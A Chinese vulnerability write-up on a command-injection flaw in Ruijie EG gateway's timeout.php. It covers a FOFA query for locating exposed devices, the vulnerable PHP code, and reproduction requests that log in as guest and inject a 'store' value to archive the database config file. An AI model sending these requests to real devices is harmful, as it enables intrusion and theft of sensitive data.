---
title: "锐捷-EWEB timeout.php 命令注入漏洞"
source: https://mrxn.net/jswz/ruijieweb-system_pi-timeout-patchsyslog-rce.html
asset_dir: assets/锐捷-eweb-timeout.php-命令注入漏洞
---

# 锐捷-EWEB timeout.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/25 18:39
- 1435浏览
- [0评论](#comment)
- 16分钟阅读

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `timeout.php` 的 `patchsyslogAction`存在[命令注入](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E) 压缩打包设备上任意文件或目录，造成设备源代码或敏感信息泄露。

代码安全审计

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `timeout.php` 关键业务 `patchsyslogAction` 逻辑的实现

```
// 获取post参数 
function p($str) {
    return isset($_POST[$str]) ? $_POST[$str] : false;
}
```

```
function patchsyslogAction(){
    $content = [];
    $commrm = "rm -f syslog.tar";
    $commtar = "tar cvf /tmp/html/syslog.tar /".p("store")."/syslog";
    exec(EscapeShellCmd($commrm), $content);
    exec(EscapeShellCmd($commtar), $content);
    $data = array("status" => true,
        "data" => $content);
    json_echo($data);
}
```

`patchsyslogAction` 接收一个 `store` 参数拼接进tar命令中，当中被打包文件的路径一部分，虽然有`EscapeShellCmd`函数过滤，不能执行完整的命令，但是不影响目录穿越打包文件啊，比如我们打包系统的数据库配置文件 `tmp/html/mvc/config/pgsql.config.php`

> 这套系统的PHP版本比较低（参考前一篇[锐捷EWEB路由器 timeout.php 任意文件上传漏洞](https://mrxn.net/jswz/ruijieweb-system_pi-timeout-rce.html)），如果低于php 5.3.29 可通过%00来截断后续的路径拼接，但是大部分还是 php 5.4 版本
>
> 漏洞修复方案

不过这不是上传名保存路径里，是命令里面，我们只需要使用如 `％20` `%23` 等空格类符号将tar的命令与后续的路径**分隔**开就可以实现打包任意目录或文件， 因此造成[命令注入](https://mrxn.net/tag/rce)漏洞，可直接打包整站！

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB timeout.php 命令注入漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 打包文件

```
POST /system_pi/timeout.php?a=patchsyslog HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

store=tmp/html/mvc/config/pgsql.config.php%20
```

[![锐捷-EWEB timeout.php 命令注入漏洞](images/img-002-919366f25bf4.webp)](https://image.mrxn.net/102b9bd014d24194972372465aa6e515.webp)

访问压缩后的文件 syslog.tar

计算机硬件

[![锐捷-EWEB timeout.php 命令注入漏洞](images/img-003-5a397d8a0414.webp)](https://image.mrxn.net/c2c1930bbe634b75bdb7c9a5df220d90.webp)

成功获取到数据库配置文件内容。

数据管理

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取cookie](#toc-5-1-)
- [5.2.打包文件](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
